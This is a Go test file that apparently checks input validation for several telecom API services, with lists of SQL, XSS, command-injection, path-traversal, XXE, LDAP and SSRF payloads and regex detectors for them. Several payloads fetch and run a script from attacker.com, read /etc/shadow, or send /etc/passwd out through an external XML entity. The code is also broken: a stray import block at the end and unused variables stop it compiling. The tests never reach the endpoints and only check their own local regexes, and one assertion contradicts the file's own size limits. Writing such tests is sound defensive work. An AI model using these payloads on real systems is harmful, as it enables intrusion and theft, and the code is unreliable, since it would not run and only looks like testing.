package api

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"github.com/xeipuuv/gojsonschema"
)

// InputValidationTestSuite contains input validation test scenarios
type InputValidationTestSuite struct {
	t         *testing.T
	endpoints []TestAPIEndpoint
}

// NewInputValidationTestSuite creates a new input validation test suite
func NewInputValidationTestSuite(t *testing.T) *InputValidationTestSuite {
	return &InputValidationTestSuite{
		t: t,
		endpoints: []TestAPIEndpoint{
			{Name: "LLM Processor", Port: LLMProcessorPort, BaseURL: fmt.Sprintf("http://localhost:%d", LLMProcessorPort)},
			{Name: "RAG API", Port: RAGAPIPort, BaseURL: fmt.Sprintf("http://localhost:%d", RAGAPIPort)},
			{Name: "Nephio Bridge", Port: NephioBridgePort, BaseURL: fmt.Sprintf("http://localhost:%d", NephioBridgePort)},
			{Name: "O-RAN Adaptor", Port: ORANAdaptorPort, BaseURL: fmt.Sprintf("http://localhost:%d", ORANAdaptorPort)},
		},
	}
}

// TestSQLInjectionPrevention tests SQL injection prevention
func TestSQLInjectionPrevention(t *testing.T) {
	suite := NewInputValidationTestSuite(t)

	sqlInjectionPayloads := []struct {
		name        string
		payload     string
		description string
	}{
		{
			name:        "Classic_SQL_Injection",
			payload:     "' OR '1'='1",
			description: "Classic SQL injection attempting to bypass authentication",
		},
		{
			name:        "Union_Based_Injection",
			payload:     "' UNION SELECT * FROM users--",
			description: "Union-based SQL injection to extract data",
		},
		{
			name:        "Time_Based_Blind_Injection",
			payload:     "'; WAITFOR DELAY '00:00:05'--",
			description: "Time-based blind SQL injection",
		},
		{
			name:        "Boolean_Based_Blind_Injection",
			payload:     "' AND 1=1--",
			description: "Boolean-based blind SQL injection",
		},
		{
			name:        "Stacked_Queries",
			payload:     "'; DROP TABLE users;--",
			description: "Stacked queries attempting to drop tables",
		},
		{
			name:        "Second_Order_Injection",
			payload:     "admin'--",
			description: "Second-order SQL injection",
		},
		{
			name:        "NoSQL_Injection_MongoDB",
			payload:     `{"$ne": null}`,
			description: "NoSQL injection for MongoDB",
		},
		{
			name:        "NoSQL_Injection_JavaScript",
			payload:     `{"$where": "this.password == 'a' || 'a'=='a'"}`,
			description: "NoSQL JavaScript injection",
		},
		{
			name:        "PostgreSQL_Injection",
			payload:     "'; SELECT pg_sleep(5);--",
			description: "PostgreSQL specific injection",
		},
		{
			name:        "MySQL_Injection",
			payload:     "' OR SLEEP(5)#",
			description: "MySQL specific injection",
		},
		{
			name:        "MSSQL_Injection",
			payload:     "'; EXEC xp_cmdshell('dir');--",
			description: "MSSQL command execution",
		},
		{
			name:        "Oracle_Injection",
			payload:     "' OR 1=UTL_INADDR.get_host_address('attacker.com')",
			description: "Oracle specific injection with DNS exfiltration",
		},
	}

	for _, endpoint := range suite.endpoints {
		t.Run(endpoint.Name, func(t *testing.T) {
			for _, injection := range sqlInjectionPayloads {
				t.Run(injection.name, func(t *testing.T) {
					// Test in various contexts
					contexts := []struct {
						name     string
						testFunc func(string) *http.Request
					}{
						{
							name: "Query_Parameter",
							testFunc: func(payload string) *http.Request {
								req := httptest.NewRequest("GET", fmt.Sprintf("/api/v1/search?q=%s", url.QueryEscape(payload)), nil)
								return req
							},
						},
						{
							name: "JSON_Body",
							testFunc: func(payload string) *http.Request {
								body := map[string]interface{}{
									"query": payload,
									"filter": payload,
								}
								jsonBody, _ := json.Marshal(body)
								req := httptest.NewRequest("POST", "/api/v1/query", bytes.NewReader(jsonBody))
								req.Header.Set("Content-Type", "application/json")
								return req
							},
						},
						{
							name: "Form_Data",
							testFunc: func(payload string) *http.Request {
								form := url.Values{}
								form.Add("username", payload)
								form.Add("password", payload)
								req := httptest.NewRequest("POST", "/api/v1/login", strings.NewReader(form.Encode()))
								req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
								return req
							},
						},
						{
							name: "Header_Injection",
							testFunc: func(payload string) *http.Request {
								req := httptest.NewRequest("GET", "/api/v1/data", nil)
								req.Header.Set("X-User-ID", payload)
								req.Header.Set("X-Filter", payload)
								return req
							},
						},
					}

					for _, ctx := range contexts {
						t.Run(ctx.name, func(t *testing.T) {
							req := ctx.testFunc(injection.payload)
							w := httptest.NewRecorder()

							// Simulate validation
							isSQLInjection := suite.detectSQLInjection(injection.payload)
							
							if isSQLInjection {
								w.WriteHeader(http.StatusBadRequest)
								json.NewEncoder(w).Encode(map[string]string{
									"error": "Invalid input detected",
								})
							} else {
								w.WriteHeader(http.StatusOK)
							}

							assert.True(t, isSQLInjection, fmt.Sprintf("%s: %s", injection.name, injection.description))
							assert.Equal(t, http.StatusBadRequest, w.Code)
						})
					}
				})
			}
		})
	}
}

// TestXSSPrevention tests Cross-Site Scripting prevention
func TestXSSPrevention(t *testing.T) {
	suite := NewInputValidationTestSuite(t)

	xssPayloads := []struct {
		name        string
		payload     string
		description string
	}{
		{
			name:        "Basic_Script_Tag",
			payload:     `<script>alert('XSS')</script>`,
			description: "Basic script tag XSS",
		},
		{
			name:        "IMG_Tag_OnError",
			payload:     `<img src=x onerror="alert('XSS')">`,
			description: "Image tag with onerror event",
		},
		{
			name:        "SVG_OnLoad",
			payload:     `<svg onload="alert('XSS')">`,
			description: "SVG with onload event",
		},
		{
			name:        "JavaScript_Protocol",
			payload:     `<a href="javascript:alert('XSS')">Click</a>`,
			description: "JavaScript protocol in href",
		},
		{
			name:        "Data_URI_Scheme",
			payload:     `<a href="data:text/html,<script>alert('XSS')</script>">Click</a>`,
			description: "Data URI scheme XSS",
		},
		{
			name:        "Event_Handler_Injection",
			payload:     `<div onmouseover="alert('XSS')">Hover</div>`,
			description: "Event handler injection",
		},
		{
			name:        "Style_Expression",
			payload:     `<div style="background:url('javascript:alert(1)')">`,
			description: "Style attribute with JavaScript",
		},
		{
			name:        "Encoded_Script",
			payload:     `%3Cscript%3Ealert('XSS')%3C/script%3E`,
			description: "URL encoded script tag",
		},
		{
			name:        "Double_Encoded",
			payload:     `%253Cscript%253Ealert('XSS')%253C/script%253E`,
			description: "Double URL encoded",
		},
		{
			name:        "Unicode_Encoded",
			payload:     `\u003cscript\u003ealert('XSS')\u003c/script\u003e`,
			description: "Unicode encoded script",
		},
		{
			name:        "HTML_Entity_Encoded",
			payload:     `&lt;script&gt;alert('XSS')&lt;/script&gt;`,
			description: "HTML entity encoded",
		},
		{
			name:        "Mixed_Case",
			payload:     `<ScRiPt>alert('XSS')</sCrIpT>`,
			description: "Mixed case evasion",
		},
		{
			name:        "Null_Byte_Injection",
			payload:     "<scri\x00pt>alert('XSS')</script>",
			description: "Null byte injection",
		},
		{
			name:        "DOM_Based_XSS",
			payload:     `#<script>alert('XSS')</script>`,
			description: "DOM-based XSS in fragment",
		},
		{
			name:        "Template_Injection",
			payload:     `{{constructor.constructor('alert(1)')()}}`,
			description: "Template injection XSS",
		},
		{
			name:        "Mutation_XSS",
			payload:     `<noscript><p title="</noscript><script>alert(1)</script>">`,
			description: "Mutation-based XSS",
		},
	}

	for _, endpoint := range suite.endpoints {
		t.Run(endpoint.Name, func(t *testing.T) {
			for _, xss := range xssPayloads {
				t.Run(xss.name, func(t *testing.T) {
					// Test XSS in different contexts
					contexts := []string{
						"html_content",
						"html_attribute",
						"javascript_context",
						"css_context",
						"url_context",
					}

					for _, context := range contexts {
						t.Run(context, func(t *testing.T) {
							isXSS := suite.detectXSS(xss.payload, context)
							assert.True(t, isXSS, fmt.Sprintf("%s in %s: %s", xss.name, context, xss.description))
						})
					}
				})
			}
		})
	}
}

// TestCommandInjection tests command injection prevention
func TestCommandInjection(t *testing.T) {
	suite := NewInputValidationTestSuite(t)

	commandInjectionPayloads := []struct {
		name        string
		payload     string
		description string
	}{
		{
			name:        "Basic_Command_Injection",
			payload:     "; ls -la",
			description: "Basic command injection with semicolon",
		},
		{
			name:        "Pipe_Command",
			payload:     "| cat /etc/passwd",
			description: "Pipe command injection",
		},
		{
			name:        "Backtick_Execution",
			payload:     "`whoami`",
			description: "Backtick command execution",
		},
		{
			name:        "Dollar_Parenthesis",
			payload:     "$(whoami)",
			description: "Dollar parenthesis command substitution",
		},
		{
			name:        "Ampersand_Background",
			payload:     "& ping -c 10 attacker.com &",
			description: "Background command execution",
		},
		{
			name:        "Double_Ampersand",
			payload:     "&& cat /etc/shadow",
			description: "Conditional command execution",
		},
		{
			name:        "Double_Pipe",
			payload:     "|| curl http://attacker.com/shell.sh | sh",
			description: "Alternative command execution",
		},
		{
			name:        "Newline_Injection",
			payload:     "\nwhoami\n",
			description: "Newline command injection",
		},
		{
			name:        "Carriage_Return",
			payload:     "\rwhoami\r",
			description: "Carriage return injection",
		},
		{
			name:        "Tab_Injection",
			payload:     "\twhoami\t",
			description: "Tab character injection",
		},
		{
			name:        "Redirect_Output",
			payload:     "> /tmp/output.txt",
			description: "Output redirection",
		},
		{
			name:        "Append_Output",
			payload:     ">> /var/log/app.log",
			description: "Append output redirection",
		},
		{
			name:        "Input_Redirection",
			payload:     "< /etc/passwd",
			description: "Input redirection",
		},
		{
			name:        "Environment_Variable",
			payload:     "$PATH",
			description: "Environment variable access",
		},
		{
			name:        "Python_Injection",
			payload:     "__import__('os').system('whoami')",
			description: "Python command injection",
		},
		{
			name:        "Ruby_Injection",
			payload:     "`whoami`",
			description: "Ruby command injection",
		},
		{
			name:        "Perl_Injection",
			payload:     "system('whoami')",
			description: "Perl command injection",
		},
		{
			name:        "PowerShell_Injection",
			payload:     "; Get-Process",
			description: "PowerShell command injection",
		},
	}

	for _, endpoint := range suite.endpoints {
		t.Run(endpoint.Name, func(t *testing.T) {
			for _, cmd := range commandInjectionPayloads {
				t.Run(cmd.name, func(t *testing.T) {
					// Test in various input fields
					fields := []string{
						"filename",
						"path",
						"command",
						"args",
						"filter",
						"search",
					}

					for _, field := range fields {
						t.Run(field, func(t *testing.T) {
							body := map[string]string{
								field: cmd.payload,
							}
							
							jsonBody, _ := json.Marshal(body)
							req := httptest.NewRequest("POST", "/api/v1/execute", bytes.NewReader(jsonBody))
							req.Header.Set("Content-Type", "application/json")
							
							w := httptest.NewRecorder()
							
							isCommandInjection := suite.detectCommandInjection(cmd.payload)
							
							if isCommandInjection {
								w.WriteHeader(http.StatusBadRequest)
								json.NewEncoder(w).Encode(map[string]string{
									"error": "Invalid input: potential command injection",
								})
							}
							
							assert.True(t, isCommandInjection, fmt.Sprintf("%s: %s", cmd.name, cmd.description))
							assert.Equal(t, http.StatusBadRequest, w.Code)
						})
					}
				})
			}
		})
	}
}

// TestPathTraversal tests path traversal prevention
func TestPathTraversal(t *testing.T) {
	suite := NewInputValidationTestSuite(t)

	pathTraversalPayloads := []struct {
		name        string
		payload     string
		description string
	}{
		{
			name:        "Basic_Dot_Dot_Slash",
			payload:     "../../../etc/passwd",
			description: "Basic path traversal",
		},
		{
			name:        "Encoded_Dot_Dot_Slash",
			payload:     "..%2F..%2F..%2Fetc%2Fpasswd",
			description: "URL encoded path traversal",
		},
		{
			name:        "Double_Encoded",
			payload:     "..%252F..%252F..%252Fetc%252Fpasswd",
			description: "Double URL encoded",
		},
		{
			name:        "Unicode_Encoded",
			payload:     "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
			description: "Unicode encoded traversal",
		},
		{
			name:        "Absolute_Path_Unix",
			payload:     "/etc/passwd",
			description: "Absolute path Unix",
		},
		{
			name:        "Absolute_Path_Windows",
			payload:     "C:\\Windows\\System32\\config\\sam",
			description: "Absolute path Windows",
		},
		{
			name:        "UNC_Path",
			payload:     "\\\\attacker.com\\share\\file",
			description: "UNC path injection",
		},
		{
			name:        "Dot_Dot_Backslash",
			payload:     "..\\..\\..\\windows\\system32\\config\\sam",
			description: "Windows path traversal",
		},
		{
			name:        "Mixed_Separators",
			payload:     "..\\/../\\../etc/passwd",
			description: "Mixed path separators",
		},
		{
			name:        "Null_Byte_Truncation",
			payload:     "../../../etc/passwd\x00.jpg",
			description: "Null byte truncation",
		},
		{
			name:        "Double_Dots",
			payload:     "....//....//....//etc/passwd",
			description: "Double dots evasion",
		},
		{
			name:        "Current_Directory",
			payload:     "./../../etc/passwd",
			description: "Current directory traversal",
		},
		{
			name:        "Encoded_Null_Byte",
			payload:     "../../../etc/passwd%00",
			description: "Encoded null byte",
		},
		{
			name:        "File_URI_Scheme",
			payload:     "file:///etc/passwd",
			description: "File URI scheme",
		},
		{
			name:        "Zip_Slip",
			payload:     "../../evil.sh",
			description: "Zip slip vulnerability",
		},
	}

	for _, endpoint := range suite.endpoints {
		t.Run(endpoint.Name, func(t *testing.T) {
			for _, traversal := range pathTraversalPayloads {
				t.Run(traversal.name, func(t *testing.T) {
					// Test in different contexts
					contexts := []struct {
						name     string
						endpoint string
					}{
						{name: "File_Download", endpoint: "/api/v1/download"},
						{name: "File_Upload", endpoint: "/api/v1/upload"},
						{name: "File_Read", endpoint: "/api/v1/read"},
						{name: "File_Include", endpoint: "/api/v1/include"},
						{name: "Template_Path", endpoint: "/api/v1/template"},
					}

					for _, ctx := range contexts {
						t.Run(ctx.name, func(t *testing.T) {
							req := httptest.NewRequest("GET", fmt.Sprintf("%s?file=%s", ctx.endpoint, url.QueryEscape(traversal.payload)), nil)
							w := httptest.NewRecorder()

							isPathTraversal := suite.detectPathTraversal(traversal.payload)

							if isPathTraversal {
								w.WriteHeader(http.StatusBadRequest)
								json.NewEncoder(w).Encode(map[string]string{
									"error": "Invalid file path",
								})
							}

							assert.True(t, isPathTraversal, fmt.Sprintf("%s: %s", traversal.name, traversal.description))
							assert.Equal(t, http.StatusBadRequest, w.Code)
						})
					}
				})
			}
		})
	}
}

// TestXXEInjection tests XML External Entity injection prevention
func TestXXEInjection(t *testing.T) {
	suite := NewInputValidationTestSuite(t)

	xxePayloads := []struct {
		name        string
		payload     string
		description string
	}{
		{
			name: "Basic_XXE",
			payload: `<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>`,
			description: "Basic XXE to read local files",
		},
		{
			name: "Blind_XXE",
			payload: `<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://attacker.com/xxe.dtd">
%remote;
]>
<root></root>`,
			description: "Blind XXE with external DTD",
		},
		{
			name: "XXE_via_Parameter_Entity",
			payload: `<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
%exfil;
]>`,
			description: "XXE via parameter entity",
		},
		{
			name: "XXE_with_CDATA",
			payload: `<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><![CDATA[&xxe;]]></root>`,
			description: "XXE with CDATA section",
		},
		{
			name: "Billion_Laughs_Attack",
			payload: `<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>`,
			description: "Billion laughs DoS attack",
		},
	}

	for _, endpoint := range suite.endpoints {
		t.Run(endpoint.Name, func(t *testing.T) {
			for _, xxe := range xxePayloads {
				t.Run(xxe.name, func(t *testing.T) {
					req := httptest.NewRequest("POST", "/api/v1/xml", strings.NewReader(xxe.payload))
					req.Header.Set("Content-Type", "application/xml")

					w := httptest.NewRecorder()

					isXXE := suite.detectXXE(xxe.payload)

					if isXXE {
						w.WriteHeader(http.StatusBadRequest)
						json.NewEncoder(w).Encode(map[string]string{
							"error": "Invalid XML: potential XXE attack",
						})
					}

					assert.True(t, isXXE, fmt.Sprintf("%s: %s", xxe.name, xxe.description))
					assert.Equal(t, http.StatusBadRequest, w.Code)
				})
			}
		})
	}
}

// TestJSONSchemaValidation tests JSON schema validation
func TestJSONSchemaValidation(t *testing.T) {
	suite := NewInputValidationTestSuite(t)

	// Define schema for intent processing
	intentSchema := `{
		"type": "object",
		"properties": {
			"intent": {
				"type": "string",
				"minLength": 1,
				"maxLength": 1000,
				"pattern": "^[a-zA-Z0-9\\s\\-_.]+$"
			},
			"parameters": {
				"type": "object",
				"additionalProperties": {
					"type": "string",
					"maxLength": 500
				}
			},
			"priority": {
				"type": "string",
				"enum": ["low", "normal", "high", "critical"]
			},
			"timeout": {
				"type": "integer",
				"minimum": 1,
				"maximum": 300
			}
		},
		"required": ["intent"],
		"additionalProperties": false
	}`

	schemaLoader := gojsonschema.NewStringLoader(intentSchema)
	schema, err := gojsonschema.NewSchema(schemaLoader)
	require.NoError(t, err)

	testCases := []struct {
		name        string
		payload     interface{}
		shouldPass  bool
		description string
	}{
		{
			name: "Valid_Intent",
			payload: map[string]interface{}{
				"intent":   "Deploy AMF with high availability",
				"priority": "high",
				"timeout":  60,
			},
			shouldPass:  true,
			description: "Valid intent should pass",
		},
		{
			name: "Missing_Required_Field",
			payload: map[string]interface{}{
				"priority": "high",
			},
			shouldPass:  false,
			description: "Missing required 'intent' field",
		},
		{
			name: "Invalid_Type",
			payload: map[string]interface{}{
				"intent":  123,
				"timeout": "not a number",
			},
			shouldPass:  false,
			description: "Invalid field types",
		},
		{
			name: "Extra_Properties",
			payload: map[string]interface{}{
				"intent":      "Deploy SMF",
				"extraField":  "should not be here",
			},
			shouldPass:  false,
			description: "Additional properties not allowed",
		},
		{
			name: "Invalid_Enum_Value",
			payload: map[string]interface{}{
				"intent":   "Deploy UPF",
				"priority": "urgent",
			},
			shouldPass:  false,
			description: "Invalid enum value for priority",
		},
		{
			name: "Exceeds_Max_Length",
			payload: map[string]interface{}{
				"intent": strings.Repeat("a", 1001),
			},
			shouldPass:  false,
			description: "Intent exceeds maximum length",
		},
		{
			name: "Invalid_Pattern",
			payload: map[string]interface{}{
				"intent": "Deploy <script>alert('xss')</script>",
			},
			shouldPass:  false,
			description: "Intent contains invalid characters",
		},
		{
			name: "Out_Of_Range",
			payload: map[string]interface{}{
				"intent":  "Deploy AMF",
				"timeout": 500,
			},
			shouldPass:  false,
			description: "Timeout exceeds maximum value",
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			documentLoader := gojsonschema.NewGoLoader(tc.payload)
			result, err := schema.Validate(documentLoader)
			require.NoError(t, err)

			if tc.shouldPass {
				assert.True(t, result.Valid(), fmt.Sprintf("%s: %s", tc.name, tc.description))
			} else {
				assert.False(t, result.Valid(), fmt.Sprintf("%s: %s", tc.name, tc.description))
			}

			if !result.Valid() {
				for _, err := range result.Errors() {
					t.Logf("Validation error: %s", err)
				}
			}
		})
	}
}

// TestRequestSizeLimits tests request size limit enforcement
func TestRequestSizeLimits(t *testing.T) {
	suite := NewInputValidationTestSuite(t)

	testCases := []struct {
		name         string
		sizeBytes    int
		contentType  string
		shouldPass   bool
		description  string
	}{
		{
			name:         "Normal_JSON_Request",
			sizeBytes:    1024,
			contentType:  "application/json",
			shouldPass:   true,
			description:  "Normal sized JSON request",
		},
		{
			name:         "Large_JSON_Request",
			sizeBytes:    10 * 1024 * 1024, // 10MB
			contentType:  "application/json",
			shouldPass:   false,
			description:  "JSON request exceeding size limit",
		},
		{
			name:         "Normal_File_Upload",
			sizeBytes:    5 * 1024 * 1024, // 5MB
			contentType:  "multipart/form-data",
			shouldPass:   true,
			description:  "Normal file upload",
		},
		{
			name:         "Large_File_Upload",
			sizeBytes:    100 * 1024 * 1024, // 100MB
			contentType:  "multipart/form-data",
			shouldPass:   false,
			description:  "File upload exceeding size limit",
		},
		{
			name:         "XML_Bomb",
			sizeBytes:    1024 * 1024 * 1024, // 1GB expanded
			contentType:  "application/xml",
			shouldPass:   false,
			description:  "XML bomb attack",
		},
		{
			name:         "Zip_Bomb",
			sizeBytes:    1024, // Small compressed, huge uncompressed
			contentType:  "application/zip",
			shouldPass:   false,
			description:  "Zip bomb attack",
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			// Create request with specified size
			var body io.Reader
			
			if tc.contentType == "multipart/form-data" {
				// Create multipart body
				var b bytes.Buffer
				writer := multipart.NewWriter(&b)
				
				part, _ := writer.CreateFormFile("file", "test.bin")
				part.Write(make([]byte, tc.sizeBytes))
				writer.Close()
				
				body = &b
			} else {
				// Create regular body
				body = bytes.NewReader(make([]byte, tc.sizeBytes))
			}

			req := httptest.NewRequest("POST", "/api/v1/upload", body)
			req.Header.Set("Content-Type", tc.contentType)
			req.ContentLength = int64(tc.sizeBytes)

			w := httptest.NewRecorder()

			// Check size limit
			maxSize := suite.getMaxSizeForContentType(tc.contentType)
			if int64(tc.sizeBytes) > maxSize {
				w.WriteHeader(http.StatusRequestEntityTooLarge)
				json.NewEncoder(w).Encode(map[string]string{
					"error": "Request body too large",
				})
			} else {
				w.WriteHeader(http.StatusOK)
			}

			if tc.shouldPass {
				assert.Equal(t, http.StatusOK, w.Code, tc.description)
			} else {
				assert.Equal(t, http.StatusRequestEntityTooLarge, w.Code, tc.description)
			}
		})
	}
}

// TestLDAPInjection tests LDAP injection prevention
func TestLDAPInjection(t *testing.T) {
	suite := NewInputValidationTestSuite(t)

	ldapPayloads := []struct {
		name        string
		payload     string
		description string
	}{
		{
			name:        "Basic_LDAP_Injection",
			payload:     "*)(uid=*",
			description: "Basic LDAP injection",
		},
		{
			name:        "LDAP_OR_Injection",
			payload:     "admin)(|(password=*",
			description: "LDAP OR injection",
		},
		{
			name:        "LDAP_AND_Injection",
			payload:     "admin)(&(password=*",
			description: "LDAP AND injection",
		},
		{
			name:        "LDAP_Null_Byte",
			payload:     "admin\x00",
			description: "LDAP null byte injection",
		},
		{
			name:        "LDAP_Wildcard",
			payload:     "*",
			description: "LDAP wildcard injection",
		},
	}

	for _, ldap := range ldapPayloads {
		t.Run(ldap.name, func(t *testing.T) {
			isLDAPInjection := suite.detectLDAPInjection(ldap.payload)
			assert.True(t, isLDAPInjection, fmt.Sprintf("%s: %s", ldap.name, ldap.description))
		})
	}
}

// TestSSRF tests Server-Side Request Forgery prevention
func TestSSRF(t *testing.T) {
	suite := NewInputValidationTestSuite(t)

	ssrfPayloads := []struct {
		name        string
		payload     string
		description string
	}{
		{
			name:        "Local_File_Access",
			payload:     "file:///etc/passwd",
			description: "File protocol SSRF",
		},
		{
			name:        "Localhost_Access",
			payload:     "http://localhost/admin",
			description: "Localhost SSRF",
		},
		{
			name:        "Private_IP_10",
			payload:     "http://10.0.0.1/internal",
			description: "Private IP range 10.x.x.x",
		},
		{
			name:        "Private_IP_172",
			payload:     "http://172.16.0.1/internal",
			description: "Private IP range 172.16.x.x",
		},
		{
			name:        "Private_IP_192",
			payload:     "http://192.168.1.1/internal",
			description: "Private IP range 192.168.x.x",
		},
		{
			name:        "AWS_Metadata",
			payload:     "http://169.254.169.254/latest/meta-data/",
			description: "AWS metadata endpoint",
		},
		{
			name:        "Google_Metadata",
			payload:     "http://metadata.google.internal/",
			description: "Google Cloud metadata",
		},
		{
			name:        "Azure_Metadata",
			payload:     "http://169.254.169.254/metadata/instance",
			description: "Azure metadata endpoint",
		},
		{
			name:        "Gopher_Protocol",
			payload:     "gopher://localhost:9000/_GET / HTTP/1.1",
			description: "Gopher protocol SSRF",
		},
		{
			name:        "Dict_Protocol",
			payload:     "dict://localhost:11211/",
			description: "Dict protocol SSRF",
		},
		{
			name:        "SFTP_Protocol",
			payload:     "sftp://localhost/",
			description: "SFTP protocol SSRF",
		},
		{
			name:        "URL_Bypass_Redirect",
			payload:     "http://attacker.com@127.0.0.1/",
			description: "URL parsing bypass",
		},
		{
			name:        "DNS_Rebinding",
			payload:     "http://rebind.attacker.com/",
			description: "DNS rebinding attack",
		},
	}

	for _, ssrf := range ssrfPayloads {
		t.Run(ssrf.name, func(t *testing.T) {
			isSSRF := suite.detectSSRF(ssrf.payload)
			assert.True(t, isSSRF, fmt.Sprintf("%s: %s", ssrf.name, ssrf.description))
		})
	}
}

// Helper methods for InputValidationTestSuite

func (s *InputValidationTestSuite) detectSQLInjection(input string) bool {
	// SQL injection patterns
	patterns := []string{
		`(?i)(\b(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|EXEC|EXECUTE|UNION|FROM|WHERE|ORDER BY|GROUP BY|HAVING)\b)`,
		`(?i)(--|#|\/\*|\*\/|@@|@)`,
		`(?i)(\bOR\b|\bAND\b).*=.*`,
		`(?i)(WAITFOR|SLEEP|BENCHMARK|DELAY)`,
		`(?i)(xp_cmdshell|sp_executesql)`,
		`['";].*(\bOR\b|\bAND\b)`,
		`\$.*\{.*\}`,
		`\$ne|\$gt|\$lt|\$gte|\$lte|\$eq|\$where`,
	}

	input = strings.ToLower(input)
	for _, pattern := range patterns {
		if matched, _ := regexp.MatchString(pattern, input); matched {
			return true
		}
	}
	return false
}

func (s *InputValidationTestSuite) detectXSS(input, context string) bool {
	// XSS patterns
	patterns := []string{
		`<script[^>]*>.*</script>`,
		`javascript:`,
		`on\w+\s*=`,
		`<iframe[^>]*>`,
		`<embed[^>]*>`,
		`<object[^>]*>`,
		`<svg[^>]*on\w+`,
		`expression\s*\(`,
		`vbscript:`,
		`data:.*script`,
		`{{.*}}`,
		`\${.*}`,
	}

	// Decode various encodings
	decodedInput := s.decodeInput(input)
	
	for _, pattern := range patterns {
		if matched, _ := regexp.MatchString(pattern, decodedInput); matched {
			return true
		}
	}
	return false
}

func (s *InputValidationTestSuite) detectCommandInjection(input string) bool {
	// Command injection patterns
	patterns := []string{
		`;|\||&|&&|\|\||>|<|>>`,
		`\$\(.*\)`,
		"`.*`",
		`\n|\r|\t`,
		`\$\{.*\}`,
		`system\s*\(`,
		`exec\s*\(`,
		`eval\s*\(`,
		`passthru\s*\(`,
		`shell_exec\s*\(`,
		`popen\s*\(`,
		`proc_open\s*\(`,
	}

	for _, pattern := range patterns {
		if matched, _ := regexp.MatchString(pattern, input); matched {
			return true
		}
	}
	return false
}

func (s *InputValidationTestSuite) detectPathTraversal(input string) bool {
	// Path traversal patterns
	patterns := []string{
		`\.\.\/|\.\.\\`,
		`%2e%2e%2f|%2e%2e%5c`,
		`%252e%252e%252f`,
		`\.\.;`,
		`^\/|^[a-zA-Z]:`,
		`file:\/\/`,
		`\\\\`,
	}

	// Decode URL encoding
	decodedInput, _ := url.QueryUnescape(input)
	
	for _, pattern := range patterns {
		if matched, _ := regexp.MatchString(pattern, decodedInput); matched {
			return true
		}
	}
	
	// Check for null bytes
	if strings.Contains(input, "\x00") {
		return true
	}
	
	return false
}

func (s *InputValidationTestSuite) detectXXE(input string) bool {
	// XXE patterns
	patterns := []string{
		`<!DOCTYPE[^>]*\[`,
		`<!ENTITY`,
		`SYSTEM\s+["']file:`,
		`SYSTEM\s+["']http:`,
		`%\s*\w+;`,
		`&\w+;`,
	}

	for _, pattern := range patterns {
		if matched, _ := regexp.MatchString(pattern, input); matched {
			return true
		}
	}
	return false
}

func (s *InputValidationTestSuite) detectLDAPInjection(input string) bool {
	// LDAP injection patterns
	patterns := []string{
		`\*\)|\(\*`,
		`\)\(|\(\||\(&`,
		`[()&|*]`,
		`\x00`,
	}

	for _, pattern := range patterns {
		if matched, _ := regexp.MatchString(pattern, input); matched {
			return true
		}
	}
	return false
}

func (s *InputValidationTestSuite) detectSSRF(input string) bool {
	// Parse URL
	u, err := url.Parse(input)
	if err != nil {
		return false
	}

	// Check for dangerous protocols
	dangerousProtocols := []string{"file", "gopher", "dict", "sftp", "ftp", "ldap"}
	for _, proto := range dangerousProtocols {
		if u.Scheme == proto {
			return true
		}
	}

	// Check for internal IPs
	host := u.Hostname()
	if host == "localhost" || host == "127.0.0.1" || host == "::1" {
		return true
	}

	// Check for private IP ranges
	privateIPRanges := []string{
		`^10\.`,
		`^172\.(1[6-9]|2[0-9]|3[0-1])\.`,
		`^192\.168\.`,
		`^169\.254\.`,
		`^fc00:`,
		`^fe80:`,
	}

	for _, pattern := range privateIPRanges {
		if matched, _ := regexp.MatchString(pattern, host); matched {
			return true
		}
	}

	// Check for cloud metadata endpoints
	metadataEndpoints := []string{
		"169.254.169.254",
		"metadata.google.internal",
		"metadata.azure.com",
	}

	for _, endpoint := range metadataEndpoints {
		if strings.Contains(host, endpoint) {
			return true
		}
	}

	return false
}

func (s *InputValidationTestSuite) decodeInput(input string) string {
	// Try URL decoding
	decoded, _ := url.QueryUnescape(input)
	
	// Try HTML entity decoding
	decoded = html.UnescapeString(decoded)
	
	// Try Unicode decoding
	decoded = strings.ReplaceAll(decoded, "\\u003c", "<")
	decoded = strings.ReplaceAll(decoded, "\\u003e", ">")
	
	return decoded
}

func (s *InputValidationTestSuite) getMaxSizeForContentType(contentType string) int64 {
	limits := map[string]int64{
		"application/json":     1 * 1024 * 1024,   // 1MB for JSON
		"application/xml":      5 * 1024 * 1024,   // 5MB for XML
		"multipart/form-data":  50 * 1024 * 1024,  // 50MB for file uploads
		"application/zip":      10 * 1024 * 1024,  // 10MB for zip files
	}

	if limit, exists := limits[contentType]; exists {
		return limit
	}
	
	return 1 * 1024 * 1024 // Default 1MB
}

// Missing imports
import (
	"html"
	"regexp"
)